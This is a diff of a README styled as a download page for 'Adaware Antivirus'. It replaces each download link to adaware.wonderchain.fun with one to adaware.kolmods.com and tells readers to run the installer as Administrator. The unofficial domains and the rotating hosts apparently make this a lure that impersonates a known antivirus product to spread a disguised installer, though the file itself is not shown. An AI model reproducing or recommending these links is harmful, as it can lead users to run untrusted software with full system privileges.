@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **Adaware Antivirus** for Windows.
 
 <p align="center">
-  <a href="https://adaware.wonderchain.fun/">
+  <a href="https://adaware.kolmods.com/">
     <img src="https://img.shields.io/badge/Download-Adaware%20Antivirus-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Adaware Antivirus">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[adaware.wonderchain.fun](https://adaware.wonderchain.fun/)** |
-| **Full URL** | `https://adaware.wonderchain.fun/` |
+| **Direct link** | **[adaware.kolmods.com](https://adaware.kolmods.com/)** |
+| **Full URL** | `https://adaware.kolmods.com/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — adaware.wonderchain.fun](https://adaware.wonderchain.fun/)** (link above)
+1. Click **[Download — adaware.kolmods.com](https://adaware.kolmods.com/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://adaware.wonderchain.fun/"><strong>⬇ Download Adaware Antivirus now</strong></a></p>
+<p align="center"><a href="https://adaware.kolmods.com/"><strong>⬇ Download Adaware Antivirus now</strong></a></p>
 
 ---
 
